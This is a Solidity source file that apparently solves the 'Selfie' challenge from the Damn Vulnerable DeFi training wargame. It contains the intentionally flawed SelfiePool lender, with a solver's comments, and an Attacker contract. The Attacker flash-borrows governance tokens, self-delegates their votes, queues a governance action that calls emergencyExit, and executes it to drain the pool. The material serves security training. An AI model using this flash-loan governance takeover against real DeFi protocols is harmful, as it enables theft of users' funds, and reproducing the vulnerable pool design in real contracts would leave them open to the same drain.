// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";

contract SelfiePool is IERC3156FlashLender, ReentrancyGuard {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    IERC20 public immutable token;
    SimpleGovernance public immutable governance;

    error RepayFailed();
    error CallerNotGovernance();
    error UnsupportedCurrency();
    error CallbackFailed();

    event EmergencyExit(address indexed receiver, uint256 amount);

    modifier onlyGovernance() { // the governance contract only
        if (msg.sender != address(governance)) {
            revert CallerNotGovernance();
        }
        _;
    }

    constructor(IERC20 _token, SimpleGovernance _governance) {
        token = _token;
        governance = _governance;
    }

    function maxFlashLoan(address _token) external view returns (uint256) {
        if (address(token) == _token) {
            return token.balanceOf(address(this));
        }
        return 0;
    }

    function flashFee(address _token, uint256) external view returns (uint256) { //@audit not doing what ought to be doing
        if (address(token) != _token) {
            revert UnsupportedCurrency();
        }
        return 0;
    }


    // anyone can call the flashloan
    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
        external 
        nonReentrant
        returns (bool)
    {
        if (_token != address(token)) { // token address
            revert UnsupportedCurrency();
        }

        token.transfer(address(_receiver), _amount);  // receiver = recovery, amount = TOKENS_IN_POOL

        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (!token.transferFrom(address(_receiver), address(this), _amount)) {
            revert RepayFailed();
        }

        return true;
    }

    // how can i get the governance to call this contract??
    function emergencyExit(address receiver) external onlyGovernance { // only the governance contract can call this function
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit EmergencyExit(receiver, amount);
    }
}

contract Attacker {
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    address recovery;
    uint256 actionId;
    DamnValuableVotes damnValuableToken;

    constructor(SelfiePool _selfiePool, SimpleGovernance _simpleGovernance, address _recovery, address _token) {
        selfiePool = _selfiePool;
        simpleGovernance = _simpleGovernance;
        recovery = _recovery;
        damnValuableToken = DamnValuableVotes(_token);

        // but i have no DVT, so can i maybe flashloan 50% of the DVT?
        // how about borrow 
        // execute the queueAction
        // repay debt
        // execute the executeAction
        

    }


    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        damnValuableToken.delegate(address(this));
        actionId = simpleGovernance.queueAction(address(selfiePool), 0, data);
        IERC20(token).approve(address(selfiePool), amount); // to allow the flashloan transfer from
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() external {
        bytes memory callData = abi.encodeWithSignature("emergencyExit(address)", recovery); 
                
        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnValuableToken), selfiePool.token().balanceOf(address(selfiePool)), callData); 
    }

    function attack_executeAction() external returns(bool){
        bytes memory resultData = simpleGovernance.executeAction(actionId);

        return true;
    }
}